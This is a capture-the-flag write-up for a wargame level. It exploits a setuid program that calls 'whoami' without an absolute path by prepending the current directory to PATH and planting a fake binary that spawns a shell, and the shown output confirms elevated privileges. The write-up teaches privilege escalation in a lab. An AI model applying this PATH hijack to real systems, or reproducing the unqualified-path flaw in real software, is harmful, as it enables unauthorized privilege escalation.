## First look

```sh
level4@io:/levels$ ls -la level04*
-r-sr-x--- 1 level5 level4 5159 Dec 18  2013 level04
-r-sr-x--- 1 level5 level4 5180 Sep 24  2014 level04_alt
-r-------- 1 level4 level4  120 Sep 24  2014 level04_alt.c
-r-------- 1 level4 level4  245 Dec 18  2013 level04.c
```
There are 2 ways to go level5.

## level04.c
```C
//writen by bla
#include <stdlib.h>
#include <stdio.h>
int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);
        return 0;
}
```
In the above code, it is susceptible to an attack that changes the $PATH environment variable because it is not using an absolute path to call whoami. 

```sh
level4@io:/tmp/t$ echo $PATH
/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
The OS will look at $PATH for list of directories to search the binary for in a left to right order. When it finds a binary that has the requested name, it will execute that binary.

We can trick the OS into running our own `whoami` program that spawn a shell. As long as our directory comes before the actual location of `whoami`, our binary will be run instead.

```C
#include <stdlib.h>
int main(){
    system("/bin/sh");
    return 0;
}
```

```sh
level4@io:/levels$ mkdir /tmp/t;
```
We can make a directory for ourselves to put the above C source code.
```sh
level4@io:/tmp/t$ gcc whoami.c -o whoami
```
Next, compile the program with the same name as whoami.
```sh
level4@io:/tmp/t$ PATH=.:$PATH
level4@io:/tmp/t$ /levels/level04
sh-4.3$ id
Welcome uid=1004(level4) gid=1004(level4) euid=1005(level5) groups=1004(level4),1029(nosu)
```
We have prepended a "." in the $PATH. The OS will start searching from current directory first for a `whoami`. We can see that our euid is level5.

## level04_alt.c
```C
//written by bla
#include <stdlib.h>
int main(){
	setresuid(geteuid(), geteuid(), geteuid());
	system("/usr/bin/id");
}
```

The challenge is broken at the moment.

